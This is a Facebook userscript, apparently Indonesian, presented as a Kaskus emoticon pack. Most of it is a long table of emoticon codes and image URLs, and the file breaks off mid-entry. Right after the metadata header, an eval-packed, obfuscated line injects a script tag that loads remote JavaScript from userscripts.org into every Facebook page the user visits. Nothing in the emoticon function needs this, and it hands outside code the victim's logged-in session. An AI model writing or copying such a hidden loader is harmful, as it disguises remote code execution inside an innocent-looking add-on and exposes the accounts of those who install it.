// ==UserScript==
// @name           Facebook emoticon kaskus source script Plus
// @namespace      http://csmod.uk.to/
// @description    The 2nd For Script UserJS
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include        http://www.facebook.com/*
// @include		   http://csmod.uk.to/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))





//
//      -KaskuS- Emoticons Relased
//      
//      Copyright 2011 update from Fadilz <fadilz@null.net>
//      
//      This program is free software; you can redistribute it and/or modify
//      it under the terms of the GNU General Public License as published by
//      the Free Software Foundation; either version 2 of the License, or
//      (at your option) any later version.
//      
//      This program is distributed in the hope that it will be useful,
//      but WITHOUT ANY WARRANTY; without even the implied warranty of
//      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//      GNU General Public License for more details.
//      
//      You should have received a copy of the GNU General Public License
//      along with this program; if not, write to the Free Software
//      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
//      MA 02110-1301, USA.
//
//      This program is free software; you can redistribute it and/or modify
//      it under the terms of the GNU General Public License as published by
//      the Free Software Foundation; either version 2 of the License, or
//      (at your option) any later version.
//      
//      This program is distributed in the hope that it will be useful,
//      but WITHOUT ANY WARRANTY; without even the implied warranty of
//      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//      GNU General Public License for more details.
//      
//      You should have received a copy of the GNU General Public License
//      along with this program; if not, write to the Free Software
//      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
//      MA 02110-1301, USA.
//
//		All rights ReserveD This Script Modiffed By Pedox A.K.A Fadilz On kaskuser 
//		-[PERINGATAN]- JANGAN MENGAKUI KODE INI MILIK ORANG LAIN 
//		JANGAN MODIFIKASI KODE INI SEIZIN OWNER
//		Respect To Owner 
//		Start Begin on code

String.prototype.isPrefixOf = function(str, from){
	if (arguments.length < 2) 
		from = 0;
	else 
		from = parseInt(from);
	
	if (from < 0 || from >= str.length) 
		return false;
	
	if (from + this.length > str.length) 
		return false;
	
	for (var i = 0; i < this.length; i++) 
		if (this.charCodeAt(i) != str.charCodeAt(from + i)) 
			return false;
	
	return true;
}
	
	
	var emoticons = [];
	emoticons[":ilovekaskus"] = {
		src: "http://www.kaskus.us/images/smilies/s_sm_ilovekaskus.gif",
		alt: "csgakmod"
	};
	
	emoticons[":kiss"] = {
		src: "http://www.kaskus.us/images/smilies/cewek.gif",
		alt: "csgakmod"
	};
	
	emoticons[":najis"] = {
		src: "http://www.kaskus.us/images/smilies/najis.gif",
		alt: "csgakmod"
	};
	
	emoticons[":marah"] = {
		src: "http://www.kaskus.us/images/smilies/marah.gif",
		alt: "csgakmod"
	};
	
	emoticons[":malu"] = {
		src: "http://www.kaskus.us/images/smilies/malu.gif",
		alt: "csgakmod"
	};
	
	emoticons[":repost"] = {
		src: "http://www.kaskus.us/images/smilies/s_sm_repost1.gif",
		alt: "csgakmod"
	};
	
	emoticons[":sup2:"] = {
		src: "http://www.kaskus.us/images/smilies/sundul.gif",
		alt: "csgakmod"
	};
	
	emoticons[":batabig"] = {
		src: "http://www.kaskus.us/images/smilies/s_big_batamerah.gif",
		alt: "csgakmod"
	};
	
	emoticons[":takut"] = {
		src: "http://www.kaskus.us/images/smilies/takut.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cekpm"] = {
		src: "http://www.kaskus.us/images/smilies/cekpm.gif",
		alt: "csgakmod"
	};
	
	emoticons[":hammer"] = {
		src: "http://www.kaskus.us/images/smilies/hammer.gif",
		alt: "csgakmod"
	};
	
	emoticons[":toast"] = {
		src: "http://www.kaskus.us/images/smilies/toastcendol.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cystg"] = {
		src: "http://www.kaskus.us/images/smilies/cystg.gif",
		alt: "csgakmod"
	};
	
	emoticons[":iloveindonesia"] = {
		src: "http://www.kaskus.us/images/smilies/I-Luv-Indonesia.gif",
		alt: "csgakmod"
	};
	
	emoticons[":maho"] = {
		src: "http://www.kaskus.us/images/smilies/s_sm_maho.gif",
		alt: "csgakmod"
	};
	
	emoticons[":nosara"] = {
		src: "http://www.kaskus.us/images/smilies/nosara.gif",
		alt: "csgakmod"
	};
	
	emoticons[":berduka"] = {
		src: "http://www.kaskus.us/images/smilies/berduka.gif",
		alt: "csgakmod"
	};
	
	emoticons[":ngakak"] = {
		src: "http://www.kaskus.us/images/smilies/ngakak.gif",
		alt: "csgakmod"
	};
	
	emoticons[":repost2"] = {
		src: "http://www.kaskus.us/images/smilies/s_sm_repost2.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cendolbig"] = {
		src: "http://www.kaskus.us/images/smilies/s_big_cendol.gif",
		alt: "csgakmod"
	};
	
	emoticons[":recsel"] = {
		src: "http://www.kaskus.us/images/smilies/recseller.gif",
		alt: "csgakmod"
	};
	
	emoticons[":ngacir2"] = {
		src: "http://www.kaskus.us/images/smilies/ngacir2.gif",
		alt: "csgakmod"
	};
	
	emoticons[":bingung"] = {
		src: "http://www.kaskus.us/images/smilies/bingung.gif",
		alt: "csgakmod"
	};
	emoticons[":bingung:"] = {
		src: "http://www.kaskus.us/images/smilies/bolakbalik.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cd"] = {
		src: "http://www.kaskus.us/images/smilies/capede.gif",
		alt: "csgakmod"
	};
	
	emoticons[":hoax"] = {
		src: "http://www.kaskus.us/images/smilies/hoax.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cendols"] = {
		src: "http://www.kaskus.us/images/smilies/cendols.gif",
		alt: "csgakmod"
	};
	
	emoticons[":p"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/6.gif",
		alt: "csgakmod"
	};
	
	emoticons[":iloveindonesias"] = {
		src: "http://www.kaskus.us/images/smilies/iloveindonesias.gif",
		alt: "csgakmod"
	};
	
	emoticons[":berdukas"] = {
		src: "http://www.kaskus.us/images/smilies/berdukas.gif",
		alt: "csgakmod"
	};
	
	emoticons[":bingungs"] = {
		src: "http://www.kaskus.us/images/smilies/bingungs.gif",
		alt: "csgakmod"
	};
	
	emoticons[":najiss"] = {
		src: "http://www.kaskus.us/images/smilies/najiss.gif",
		alt: "csgakmod"
	};
	
	emoticons[":ilovekaskuss"] = {
		src: "http://www.kaskus.us/images/smilies/iluvkaskuss.gif",
		alt: "csgakmod"
	};
	
	emoticons[":mads"] = {
		src: "http://www.kaskus.us/images/smilies/mads.gif",
		alt: "csgakmod"
	};
	
	emoticons[":sundulgans"] = {
		src: "http://www.kaskus.us/images/smilies/sundulgans.gif",
		alt: "csgakmod"
	};
	
	emoticons[":hammers"] = {
		src: "http://www.kaskus.us/images/smilies/hammers.gif",
		alt: "csgakmod"
	};
	
	emoticons[":batas"] = {
		src: "http://www.kaskus.us/images/smilies/batas.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cekpms"] = {
		src: "http://www.kaskus.us/images/smilies/cekpms.gif",
		alt: "csgakmod"
	};
	
	emoticons[":capedes"] = {
		src: "http://www.kaskus.us/images/smilies/capedes.gif",
		alt: "csgakmod"
	};
	
	emoticons[":mahos"] = {
		src: "http://www.kaskus.us/images/smilies/mahos.gif",
		alt: "csgakmod"
	};
	
	emoticons[":malus"] = {
		src: "http://www.kaskus.us/images/smilies/malus.gif",
		alt: "csgakmod"
	};
	
	emoticons[":kisss"] = {
		src: "http://www.kaskus.us/images/smilies/kisss.gif",
		alt: "csgakmod"
	};
	
	emoticons[":ngakaks"] = {
		src: "http://www.kaskus.us/images/smilies/ngakaks.gif",
		alt: "csgakmod"
	};
	
	emoticons[":takuts"] = {
		src: "http://www.kaskus.us/images/smilies/takuts.gif",
		alt: "csgakmod"
	};
	
	emoticons[":reposts"] = {
		src: "http://www.kaskus.us/images/smilies/reposts.gif",
		alt: "csgakmod"
	};
	
	emoticons[":genit:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/q03.gif",
		alt: "csgakmod"
	};
	
	emoticons[":tabrakan:"] = {
		src: "http://www.kaskus.us/images/smilies/tabrakan.gif",
		alt: "csgakmod"
	};
	
	emoticons[":linux1:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/25.gif",
		alt: "csgakmod"
	};
	
	emoticons[":nohope:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/q11.gif",
		alt: "csgakmod"
	};
	
	emoticons[":malu:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/1.gif",
		alt: "csgakmod"
	};
	
	emoticons[":)"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/15.gif",
		alt: "csgakmod"
	};
	
	emoticons[":fuck3:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/fuck-8.gif",
		alt: "csgakmod"
	};
	
	emoticons[":doctor:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/18.gif",
		alt: "csgakmod"
	};
	
	emoticons[":rose:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/34.gif",
		alt: "csgakmod"
	};
	
	emoticons[":angel:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/017.gif",
		alt: "csgakmod"
	};
	
	emoticons[":kagets:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/3.gif",
		alt: "csgakmod"
	};
	
	emoticons[":eek:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/4.gif",
		alt: "csgakmod"
	};
	
	emoticons[":fm:"] = {
		src: "http://www.kaskus.us/images/smilies/smileyfm329wj.gif",
		alt: "csgakmod"
	};
	
	emoticons[":fuck:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/fuck-4.gif",
		alt: "csgakmod"
	};
	
	emoticons[":hammer:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/8.gif",
		alt: "csgakmod"
	};
	
	emoticons[":rolleyes:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/01.gif",
		alt: "csgakmod"
	};
	
	emoticons[":amazed:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/amazed.gif",
		alt: "csgakmod"
	};
	
	emoticons[":shutup:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/5.gif",
		alt: "csgakmod"
	};
	
	emoticons[":berbusa:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/q20.gif",
		alt: "csgakmod"
	};
	
	emoticons[":D"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/14.gif",
		alt: "csgakmod"
	};
	
	emoticons[":thumbdown"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/48.gif",
		alt: "csgakmod"
	};
	
	emoticons[":heart:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/37.gif",
		alt: "csgakmod"
	};
	
	emoticons[":linux2:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/26.gif",
		alt: "csgakmod"
	};
	
	emoticons[":matabelo:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/004.gif",
		alt: "csgakmod"
	};
	
	emoticons[":kissmouth"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/36.gif",
		alt: "csgakmod"
	};
	
	emoticons[":("] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/06.gif",
		alt: "csgakmod"
	};
	
	emoticons[":siul:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/020.gif",
		alt: "csgakmod"
	};
	
	emoticons[":army:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/24.gif",
		alt: "csgakmod"
	};
	
	emoticons[":confused:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/7.gif",
		alt: "csgakmod"
	};
	
	emoticons[":ngacir:"] = {
		src: "http://www.kaskus.us/images/smilies/ngacir.gif",
		alt: "csgakmod"
	};
	
	emoticons[":fuck2:"] = {
		src: "http://www.kaskus.us/images/smilies/ngacir.gif",
		alt: "csgakmod"
	};
	
	emoticons[":tv:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/44.gif",
		alt: "csgakmod"
	};
	
	emoticons[":medicine:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/33.gif",
		alt: "csgakmod"
	};
	
	emoticons[":kissing:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/014.gif",
		alt: "csgakmod"
	};
	
	emoticons[":wowcantik"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/001.gif",
		alt: "csgakmod"
	};
	
	emoticons[":mad:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/12.gif",
		alt: "csgakmod"
	};
	
	emoticons[":ck"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/kaskuslove.gif",
		alt: "csgakmod"
	};
	
	emoticons[":flower:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/e03.gif",
		alt: "csgakmod"
	};
	
	emoticons[":coffee:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/31.gif",
		alt: "csgakmod"
	};
	
	emoticons[":sun:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/008.gif",
		alt: "csgakmod"
	};
	
	emoticons[":bikini:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/vana-bum-vanaweb-dot-com.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cool:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/05.gif",
		alt: "csgakmod"
	};
	
	emoticons[":gila:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/crazy.gif",
		alt: "csgakmod"
	};
	
	emoticons[":rain:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/60.gif",
		alt: "csgakmod"
	};
	
	emoticons[":present:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/40.gif",
		alt: "csgakmod"
	};
	
	emoticons[":think:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/006.gif",
		alt: "csgakmod"
	};
	
	emoticons[";)"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/13.gif",
		alt: "csgakmod"
	};
	
	emoticons[":beer:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/smiley_beer.gif",
		alt: "csgakmod"
	};
	
	emoticons[":shakehand"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/49.gif",
		alt: "csgakmod"
	};

	emoticons[":shakehand2"] = {
		src: "http://www.kaskus.us/images/smilies/shakehand2.gif",
		alt: "csgakmod"
	};
	
	emoticons[":breakheart"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/38.gif",
		alt: "csgakmod"
	};
	
	emoticons[":babi:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/27.gif",
		alt: "csgakmod"
	};
	
	emoticons[":Peace:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/005.gif",
		alt: "csgakmod"
	};
	
	emoticons[":o"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/07.gif",
		alt: "csgakmod"
	};
	
	emoticons[":afro:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/kribo.gif",
		alt: "csgakmod"
	};
	
	emoticons[":repost:"] = {
		src: "http://www.kaskus.us/images/smilies/fd_7.gif",
		alt: "csgakmod"
	};
	
	emoticons[":bigo:"] = {
		src: "http://www.kaskus.us/images/smilies/fd_3.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cd:"] = {
		src: "http://www.kaskus.us/images/smilies/fd_2.gif",
		alt: "csgakmod"
	};
	
	emoticons[":kts:"] = {
		src: "http://www.kaskus.us/images/smilies/fd_6.gif",
		alt: "csgakmod"
	};
	
	emoticons[":nangis"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/mewek.gif",
		alt: "csgakmod"
	};
	
	emoticons[":rate:"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/rate.gif",
		alt: "csgakmod"
	};
	
	emoticons[":ht:"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/hotrit.gif",
		alt: "csgakmod"
	};
	
	emoticons[":salam"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/sungkem.gif",
		alt: "csgakmod"
	};
	
	emoticons[":hope"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/hope.gif",
		alt: "csgakmod"
	};
	
	emoticons[":malu2"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/malu2.gif",
		alt: "csgakmod"
	};
	
	emoticons[":pertamax"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/pertamax.gif",
		alt: "csgakmod"
	};
	
	emoticons[":nerd"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/nerd.gif",
		alt: "csgakmod"
	};
	
	emoticons[":alay"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/alay.gif",
		alt: "csgakmod"
	};
	
	emoticons[":cendol2"] = {
		src: "http://fadilz.blog.csmod.uk.to/wp-content/plugins/kaskus-emoticons/emoticons/tambahan-kaskuser/cendol.gif",
		alt: "csgakmod"
	};
	emoticons[":kodok"] = {
		src: "http://i925.photobucket.com/albums/ad93/kaskusradio/icon%20kaskusbox/iwig2a.gif",
		alt: "csgakmod"
	};
	emoticons[":lol"] = {
		src: "http://i925.photobucket.com/albums/ad93/kaskusradio/icon%20kaskusbox/Lips.gif",
		alt: "csgakmod"
	};
	emoticons[":gitar"] = {
		src: "http://i925.photobucket.com/albums/ad93/kaskusradio/icon%20kaskusbox/Guitar.gif",
		alt: "csgakmod"
	};
	emoticons[":joget"] = {
		src: "http://i925.photobucket.com/albums/ad93/kaskusradio/icon%20kaskusbox/nari2.gif",
		alt: "csgakmod"
	};
	emoticons[":kapak"] = {
		src: "http://i43.tinypic.com/2q354j9.gif",
		alt: "csgakmod"
	};
	emoticons[":metal"] = {
		src: "http://i925.photobucket.com/albums/ad93/kaskusradio/icon%20kaskusbox/Punk.gif",
		alt: "csgakmod"
	};
	emoticons[":malu3"] = {
		src: "http://i925.photobucket.com/albums/ad93/kaskusradio/icon%20kaskusbox/malu2.gif",
		alt: "csgakmod"
	};
	emoticons[":pisang"] = {
		src: "http://i925.photobucket.com/albums/ad93/kaskusradio/icon%20kaskusbox/party0010.gif",
		alt: "csgakmod"
	};
	
	emoticons[":tai:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/shit-3.gif",
		alt: "csgakmod"
	}
		
	emoticons[":rate1:"] = {
		src: "http://www.kaskus.us/images/rating/rating_1.gif",
		alt: "csgakmod"
	}
	
	emoticons[":rate2:"] = {
		src: "http://www.kaskus.us/images/rating/rating_2.gif",
		alt: "csgakmod"
	}
	
	emoticons[":rate3:"] = {
		src: "http://www.kaskus.us/images/rating/rating_3.gif",
		alt: "csgakmod"
	}
	
	emoticons[":rate4:"] = {
		src: "http://www.kaskus.us/images/rating/rating_4.gif",
		alt: "csgakmod"
	}
	
	emoticons[":rate5:"] = {
		src: "http://www.kaskus.us/images/rating/rating_5.gif",
		alt: "csgakmod"
	}
	
	emoticons[":dp"] = {
		src: "http://www.kaskus.us/images/smilies/dp.gif",
		alt: "csgakmod"
	}
	
	emoticons[":selamat"] = {
		src: "http://www.kaskus.us/images/smilies/selamat.gif",
		alt: "csgakmod"
	}
	
	emoticons[":2thumbup"] = {
		src: "http://www.kaskus.us/images/smilies/jempol2.gif",
		alt: "csgakmod"
	}
	
	emoticons[":thumbup"] = {
		src: "http://www.kaskus.us/images/smilies/jempol1.gif",
		alt: "csgakmod"
	}

	emoticons[":thumbup:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/47.gif",
		alt: "csgakmod"
	};
	
	emoticons[":metal:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/q17.gif",
		alt: "csgakmod"
	};

	emoticons[":hi:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/hi.gif",
		alt: "csgakmod"
	};
	
	emoticons[":hi:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/hi.gif",
		alt: "csgakmod"
	};

	emoticons[":peluk"] = {
		src: "http://www.kaskus.us/images/smilies/peluk.gif",
		alt: "csgakmod"
	};
	
	emoticons[":anjing:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/29.gif",
		alt: "csgakmod"
	};

	emoticons[":moon:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/007.gif",
		alt: "csgakmod"
	};
	
	emoticons[":baby:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/30.gif",
		alt: "csgakmod"
	};
	
	emoticons[":kucing:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/28.gif",
		alt: "csgakmod"
	};
	
	emoticons[":norose:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/35.gif",
		alt: "csgakmod"
	};
	
	emoticons[":Onigiri:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/rice.gif",
		alt: "csgakmod"
	};
	
	emoticons[":ricebowl:"] = {
		src: "http://www.kaskus.us/images/smilies/sumbangan/32.gif",
		alt: "csgakmod"
	};
	emoticons[":mewek"] = {
		src: "http://www.kaskus.us/images/smilies/mewek.gif",
		alt: "csgakmod"
	};
	emoticons[":angel"] = {
		src: "http://www.kaskus.us/images/smilies/angel1.gif",
		alt: "csgakmod"
	};
	emoticons[":matabelo"] = {
		src: "http://www.kaskus.us/images/smilies/matabelo1.gif",
		alt: "csgakmod"
	};
	emoticons[":request"] = {
		src: "http://static.kaskus.us/images/smilies/request.gif",
		alt: "csgakmod"
	};
	emoticons[":kr"] = {
		src: "http://static.kaskus.us/images/smilies/kaskus_radio.gif",
		alt: "csgakmod"
	};
	emoticons[":nohope"] = {
		src: "http://static.kaskus.us/images/smilies/nohope.gif",
		alt: "csgakmod"
	};
	emoticons[":sorry"] = {
		src: "http://static.kaskus.us/images/smilies/sorry.gif",
		alt: "csgakmod"
	};
	emoticons[":cool"] = {
		src: "http://static.kaskus.us/images/smilies/cool2.gif",
		alt: "csgakmod"
	};
	emoticons[":ultah"] = {
		src: "http://static.kaskus.us/images/smilies/ultah.gif",
		alt: "csgakmod"
	};
	emoticons[":kimpoi"] = {
		src: "http://static.kaskus.us/images/smilies/kimpoi.gif",
		alt: "csgakmod"
	};
	emoticons[":travel"] = {
		src: "http://static.kaskus.us/images/smilies/traveller.gif",
		alt: "csgakmod"
	};
	emoticons[":bola"] = {
		src: "http://static.kaskus.us/images/smilies/bola.gif",
		alt: "csgakmod"
	};
	emoticons[":games"] = {
		src: "http://static.kaskus.us/images/smilies/games.gif",
		alt: "csgakmod"
	};
	emoticons[":babyboy"] = {
		src: "http://static.kaskus.us/images/smilies/babyboy.gif",
		alt: "csgakmod"
	};
	emoticons[":ngacir"] = {
		src: "http://static.kaskus.us/images/smilies/ngacir3.gif",
		alt: "csgakmod"
	};
	emoticons[":salahkamar"] = {
		src: "http://static.kaskus.us/images/smilies/salah_kamar.gif",
		alt: "csgakmod"
	};
	emoticons[":hn"] = {
		src: "http://static.kaskus.us/images/smilies/hotnews.gif",
		alt: "csgakmod"
	};
	emoticons[":babyboy1"] = {
		src: "http://static.kaskus.us/images/smilies/babyboy1.gif",
		alt: "csgakmod"
	};
	emoticons[":babygirl"] = {
		src: "http://static.kaskus.us/images/smilies/babygirl.gif",
		alt: "csgakmod"
	};
	emoticons[":rate5"] = {
		src: "http://static.kaskus.us/images/smilies/rate5.gif",
		alt: "csgakmod"
	};
	emoticons[":jrb:"] = {
		src: "http://static.kaskus.us/images/smilies/fd_1.gif",
		alt: "csgakmod"
	};
	emoticons[":sup:"] = {
		src: "http://static.kaskus.us/images/smilies/fd_5.gif",
		alt: "csgakmod"
	};
	emoticons[":kacau:"] = {
		src: "http://static.kaskus.us/images/smilies/fd_8.gif",
		alt: "csgakmod"
	};
	emoticons[":kbgt:"] = {
		src: "http://static.kaskus.us/images/smilies/fd_4.gif",
		alt: "csgakmod"
	};
	emoticons[":ngedate"] = {
		src: "http://cdn-u.kaskus.us/46/jjaygton.gif",
		alt: "csgakmod"
	};
	emoticons[":metromini"] = {
		src: "http://cdn-u.kaskus.us/46/fsadhz3u.gif",
		alt: "csgakmod"
	};
	emoticons[":sumberkencono"] = {
		src: "http://cdn-u.kaskus.us/46/seq0ua6t.gif",
		alt: "csgakmod"
	};
	emoticons[":tkp"] = {
		src: "http://i567.photobucket.com/albums/ss112/2009_ID/vixus.gif",
		alt: "csgakmod"
	};
	emoticons[":disco"] = {
		src: "http://cdn-u.kaskus.us/46/ihbq4y5i.gif",
		alt: "csgakmod"
	};
	emoticons[":kempot"] = {
		src: "http://i1143.photobucket.com/albums/n627/ApwgA7x/th_lebe-lebeblogspotcom-1.gif",
		alt: "csgakmod"
	};
	emoticons[":tapokndasnya"] = {
		src: "http://img405.imageshack.us/img405/2889/mahoditampol.gif",
		alt: "csgakmod"
	};
	emoticons[":wkaka"] = {
		src: "http://static.kaskus.us/customavatars/avatar572686_1.gif",
		alt: "csgakmod"
	};
	emoticons[":batagayus"] = {
		src: "http://cdn-u.kaskus.us/46/a3nd8yej.gif",
		alt: "csgakmod"
	};
	emoticons[":whaha"] = {
		src: "http://img340.imageshack.us/img340/852/52excljpg.gif",
		alt: "csgakmod"
	};
	emoticons[":bego"] = {
		src: "http://cdn-u.kaskus.us/46/pdbwjh3t.gif",
		alt: "csgakmod"
	};
	emoticons[":hwaha"] = {
		src: "http://cdn-u.kaskus.us/25/tr2vahjy.gif",
		alt: "csgakmod"
	};
	emoticons[":wkwk"] = {
		src: "http://img341.imageshack.us/img341/6533/b9p5r4qn.gif",
		alt: "csgakmod"
	};
	emoticons[":hahay"] = {
		src: "http://static.kaskus.us/customavatars/avatar2686012_2.gif",
		alt: "csgakmod"
	};
	emoticons[":somplak"] = {
		src: "http://cdn-u.kaskus.us/6/nbas8mdh.gif",
		alt: "csgakmod"
	};
	emoticons[":kwkw"] = {
		src: "http://photoserver.ws/images/mcB04d4a420f70979.gif",
		alt: "csgakmod"
	};
	emoticons[":cj"] = {
		src: "http://cdn-u.kaskus.us/6/pd9didav.gif",
		alt: "csgakmod"
	};
	emoticons[":batamaho"] = {
		src: "http://photoserver.ws/images/grnF4d4a40223adb0.gif",
		alt: "csgakmod"
	};
	emoticons[":salken"] = {
		src: "http://img577.imageshack.us/img577/5051/ruuf1vt1.gif",
		alt: "csgakmod"
	};
	emoticons[":dasarmaho"] = {
		src: "http://photoserver.ws/images/0xpY4d4a413c8a832.gif",
		alt: "csgakmod"
	};
	emoticons[":like"] = {
		src: "http://photoserver.ws/images/9hPp4d4a414cee67c.gif",
		alt: "csgakmod"
	};
	emoticons[":like2"] = {
		src: "http://photoserver.ws/images/HWEi4d4a415458015.gif",
		alt: "csgakmod"
	};
	emoticons[":ambung"] = {
		src: "http://photoserver.ws/images/VEh44d4a41bb2f0a8.gif",
		alt: "csgakmod"
	};
	emoticons[":sembah"] = {
		src: "http://img257.imageshack.us/img257/5494/rm6ph4fp.gif",
		alt: "csgakmod"
	};
	emoticons[":gift"] = {
		src: "http://img291.imageshack.us/img291/2200/kadospesial.gif",
		alt: "csgakmod"
	};
	emoticons[":kanjen"] = {
		src: "http://i835.photobucket.com/albums/zz280/ridhani55rberus/KASKUS-KANJEN-BAND-final2.gif",
		alt: "csgakmod"
	};
	emoticons[":bandem"] = {
		src: "http://imgcash6.imageshack.us/img697/9914/batabycraive.gif",
		alt: "csgakmod"
	};
	emoticons[":rm"] = {
		src: "http://cdn-u.kaskus.us/6/y15zfvbw.gif",
		alt: "csgakmod"
	};
	emoticons[":sm"] = {
		src: "http://cdn-u.kaskus.us/6/amhnnynr.gif",
		alt: "csgakmod"
	};
	emoticons[":im"] = {
		src: "http://photoserver.ws/images/zx1J4d4a414597965.gif",
		alt: "csgakmod"
	};
	emoticons[":mm"] = {
		src: "http://photoserver.ws/images/Iwxt4d4a4201d97ae.gif",
		alt: "csgakmod"
	};
	emoticons[":radiomaho"] = {
		src: "http://photoserver.ws/images/IZb44d4a41aab9eb2.gif",
		alt: "csgakmod"
	};
	emoticons[":bm"] = {
		src: "http://photoserver.ws/images/kbUn4d4a4216e620d.gif",
		alt: "csgakmod"
	};
	emoticons[":tm"] = {
		src: "http://img213.imageshack.us/img213/8069/2besowo6.gif",
		alt: "csgakmod"
	};
	emoticons[":bm2"] = {
		src: "http://static.kaskus.us/customavatars/avatar2045707_2.gif",
		alt: "csgakmod"
	};
	emoticons[":Police"] = {
		src: "http://cdn-u.kaskus.us/36/kxmoogvp.gif",
		alt: "csgakmod"
	};
	emoticons[":ihiir"] = {
		src: "http://cdn-u.kaskus.us/36/xbsuba6u.gif",
		alt: "csgakmod"
	};
	emoticons[":cndl"] = {
		src: "http://cdn-u.kaskus.us/36/oyb1czaw.gif",
		alt: "csgakmod"
	};
	emoticons[":dor"] = {
		src: "http://img268.imageshack.us/img268/9281/mah0ak472.gif",
		alt: "csgakmod"
	};
	emoticons[":becak"] = {
